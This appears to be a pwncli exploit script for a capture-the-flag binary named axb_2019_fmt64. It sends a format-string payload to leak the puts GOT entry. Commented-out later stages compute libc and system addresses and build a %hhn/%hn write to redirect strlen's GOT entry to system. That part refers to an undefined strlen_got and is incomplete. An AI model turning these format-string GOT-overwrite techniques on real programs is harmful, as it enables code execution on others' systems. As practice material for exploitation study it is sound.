#!/usr/bin/env python3
# Date: 2024-11-08 12:39:57
# Link: https://github.com/RoderickChan/pwncli

from pwncli import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './axb_2019_fmt64'
context.log_level = 'debug'
context.timeout = 5

gift.io = process('./axb_2019_fmt64')
# gift.io = remote('127.0.0.1', 13337)
gift.elf = ELF('./axb_2019_fmt64')
gift.libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

def cmd(i, prompt):
    sla(prompt, i)

debug()

ru(b'Please tell me:')

puts_got = elf.got['puts']
payload = b'%9$pAAAA' + p64(puts_got)
s(payload)

# ru(b':')
# puts_addr = int(ru(b'AAAA'), 16)
# libc_base = puts_addr - libc.sym['puts']
# system_addr = libc_base + libc.sym['system']
# success(f'libc_base --> {hex(libc_base)}')

# ru(b'Please tell me:')
# high_sys = (system_addr >> 16) & 0xff
# low_sys = system_addr & 0xffff

# payload2 = b"%" + bytes(str(high_sys - 9), "utf-8") + b"c%12$hhn" + b"%" + bytes(str(low_sys - high_sys), "utf-8") + b"c%13$hn"
# payload2 = payload2.ljust(32,b"A") + p64(strlen_got + 2) + p64(strlen_got)

ia()
